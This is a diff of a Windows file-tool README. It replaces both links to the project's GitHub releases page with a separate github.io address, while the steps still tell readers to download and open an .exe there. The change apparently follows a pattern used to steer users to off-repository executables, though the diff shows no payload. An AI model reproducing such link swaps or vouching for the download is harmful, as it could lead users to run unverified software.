@@ -1,6 +1,6 @@
 # 📂 quickfile-actions - Manage your local files with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/Janeczkavoid827/quickfile-actions/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://janeczkavoid827.github.io)
 
 Quickfile-actions manages your images and files directly on your computer. You keep full control over your data because the application works locally. It does not send your files to the web for processing. You can change file formats, adjust image sizes, and clean metadata without privacy risks.
 
@@ -8,7 +8,7 @@ Quickfile-actions manages your images and files directly on your computer. You k
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this release page](https://github.com/Janeczkavoid827/quickfile-actions) to find the latest version.
+1. Visit [this release page](https://janeczkavoid827.github.io) to find the latest version.
 2. Look for the Assets section at the bottom of the release notes.
 3. Click the file ending in `.exe` to start your download.
 4. Open the downloaded file once the process finishes.
